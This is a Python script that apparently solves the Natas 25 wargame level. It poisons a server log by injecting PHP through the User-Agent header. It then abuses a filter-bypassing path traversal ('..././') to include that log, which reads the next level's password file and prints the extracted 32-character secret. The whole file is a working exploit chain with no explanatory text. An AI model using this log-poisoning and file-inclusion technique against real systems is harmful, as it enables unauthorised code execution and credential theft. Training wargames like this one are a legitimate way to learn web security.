import config
import os, re
from requests import *

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

url = "http://{}.{}".format(user, config.url)

code = "<?php include('/etc/natas_webpass/natas26')  ?>"

response = get(url, auth=(user, password))
session_id = response.cookies["PHPSESSID"]
lang = "..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_{}.log".format(session_id)

response = get(url, auth=(user, password), params={"lang" : lang}, cookies=response.cookies, headers={"User-Agent" : code})

print(response.content)

password = re.findall(r"\w{32}", response.content)[-1]

print(password)